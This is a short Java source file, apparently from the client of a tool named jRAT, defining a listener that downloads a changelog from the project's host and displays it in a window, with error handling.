package se.jrat.client.listeners;

import se.jrat.client.Constants;
import se.jrat.client.ErrorDialog;
import se.jrat.client.net.WebRequest;
import se.jrat.client.ui.frames.FrameChangelog;
import se.jrat.common.Version;

public class ChangelogListener extends Performable {

	@Override
	public void perform() {
		FrameChangelog frame;
		try {
			frame = new FrameChangelog(WebRequest.getUrl(Constants.HOST + "/api/changelog.php"), Version.getVersion());
			frame.setVisible(true);
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}

}
